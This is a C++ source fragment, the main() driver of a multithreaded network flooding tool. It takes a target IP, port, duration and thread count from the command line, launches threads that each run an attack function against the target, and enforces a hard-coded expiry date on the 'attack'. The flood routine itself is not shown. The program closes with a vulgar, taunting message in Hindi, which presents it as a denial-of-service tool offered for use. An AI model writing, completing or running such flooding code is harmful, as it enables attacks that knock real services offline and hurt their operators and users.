int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    string ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    ThreadData data = {ip, port, duration};

    // Set expiration time
    tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900; 
    expiration_tm.tm_mon = 3; 
    expiration_tm.tm_mday = 10; 
    expiration_tm.tm_hour = 23; 
    expiration_tm.tm_min = 59; 
    expiration_tm.tm_sec = 59; 

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (time(nullptr) >= data.expiration_time) {
        cout << "Attack has expired. Exiting." << endl;
        return 0;
    }

    cout << "Flood started on " << ip << ":" << port 
         << " for " << duration << " seconds with " 
         << threads << " threads" << endl;

    vector<thread> thread_pool;

    for (int i = 0; i < threads; i++) {
        thread_pool.emplace_back(attack, data);
        cout << "Launched thread " << i + 1 << endl;
    }

    for (auto& th : thread_pool) {
        th.join();
    }

    cout << "𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝🖕 Ab dekhta hu lauda kaise nahi hota " << endl;

    return 0;
}
